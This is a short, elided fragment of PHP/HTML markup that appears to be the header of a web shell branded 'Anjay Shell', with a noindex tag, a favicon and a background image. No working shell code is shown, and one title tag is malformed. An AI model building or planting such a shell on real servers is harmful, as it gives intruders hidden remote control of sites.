...
<html>
<head>
	<?php echo "<Selebew anjay</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://imgur.com/hdvwpmk.png" type="image/x-icon">
</head>
<body bgcolor="#1f1f1f" text="#ffffff" style="background-image: url('https://imgur.com/xiLIl4S.jpg'); background-size: cover; background-position: center;">
...
<center>
<?php
echo '<font face="Bungee" size="5">Anjay Shell</font></center>
